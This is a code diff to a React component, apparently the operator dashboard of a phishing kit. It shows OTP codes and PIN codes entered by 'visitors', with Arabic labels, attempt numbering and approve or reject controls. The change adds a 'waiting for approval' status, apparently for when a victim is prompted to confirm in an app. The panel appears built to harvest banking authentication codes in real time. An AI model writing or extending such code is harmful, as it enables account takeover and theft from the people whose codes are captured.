@@ -345,14 +345,19 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
 
   sortedOtpHistory.forEach((otpHistory: any, index: number) => {
     const otp = otpHistory.data?._v5;
+    const isLatestOtp = index === 0;
+    const effectiveOtpStatus =
+      isLatestOtp && visitor._v5Status === "message"
+        ? "message"
+        : otpHistory.status;
     const hasBeenActioned =
-      otpHistory.status === "approved" || otpHistory.status === "rejected";
+      effectiveOtpStatus === "approved" || effectiveOtpStatus === "rejected";
 
     if (otp) {
       bubbles.push({
         id: `otp-${otpHistory.id || index}`,
         title:
-          index === 0
+          isLatestOtp
             ? "كود OTP"
             : `كود OTP (محاولة ${sortedOtpHistory.length - index})`,
         icon: "🔑",
@@ -360,16 +365,18 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
         data: {
           الكود: otp,
           الحالة:
-            otpHistory.status === "approved"
+            effectiveOtpStatus === "approved"
               ? "✓ تم القبول"
-              : otpHistory.status === "rejected"
+              : effectiveOtpStatus === "rejected"
               ? "✗ تم الرفض"
+              : effectiveOtpStatus === "message"
+              ? "📲 في انتظار الموافقة"
               : "⬳ قيد المراجعة",
         },
         timestamp: otpHistory.timestamp,
-        status: otpHistory.status || ("pending" as const),
+        status: effectiveOtpStatus || ("pending" as const),
         showActions: !hasBeenActioned,
-        isLatest: index === 0,
+        isLatest: isLatestOtp,
         type: "otp",
       });
     }
@@ -387,14 +394,19 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
 
   sortedPinHistory.forEach((pinHistory: any, index: number) => {
     const pinCode = pinHistory.data?._v6;
+    const isLatestPin = index === 0;
+    const effectivePinStatus =
+      isLatestPin && visitor.pinStatus === "message"
+        ? "message"
+        : pinHistory.status;
     const hasBeenActioned =
-      pinHistory.status === "approved" || pinHistory.status === "rejected";
+      effectivePinStatus === "approved" || effectivePinStatus === "rejected";
 
     if (pinCode) {
       bubbles.push({
         id: `pin-${pinHistory.id || index}`,
         title:
-          index === 0
+          isLatestPin
             ? "رمز PIN"
             : `رمز PIN (محاولة ${sortedPinHistory.length - index})`,
         icon: "🔐",
@@ -402,16 +414,18 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
         data: {
           الكود: pinCode,
           الحالة:
-            pinHistory.status === "approved"
+            effectivePinStatus === "approved"
               ? "✓ تم القبول"
-              : pinHistory.status === "rejected"
+              : effectivePinStatus === "rejected"
               ? "✗ تم الرفض"
+              : effectivePinStatus === "message"
+              ? "📲 في انتظار الموافقة"
               : "⬳ قيد المراجعة",
         },
         timestamp: pinHistory.timestamp,
-        status: pinHistory.status || ("pending" as const),
+        status: effectivePinStatus || ("pending" as const),
         showActions: !hasBeenActioned,
-        isLatest: index === 0,
+        isLatest: isLatestPin,
         type: "pin",
       });
     }
@@ -609,6 +623,8 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
           ? "✅ مقبول"
           : visitor.finalOtpStatus === "rejected"
           ? "❌ مرفوض"
+          : visitor.finalOtpStatus === "message"
+          ? "📲 في انتظار الموافقة"
           : visitor.finalOtpStatus === "pending"
           ? "⏳ قيد المراجعة"
           : "⏳ في انتظار الإدخال",
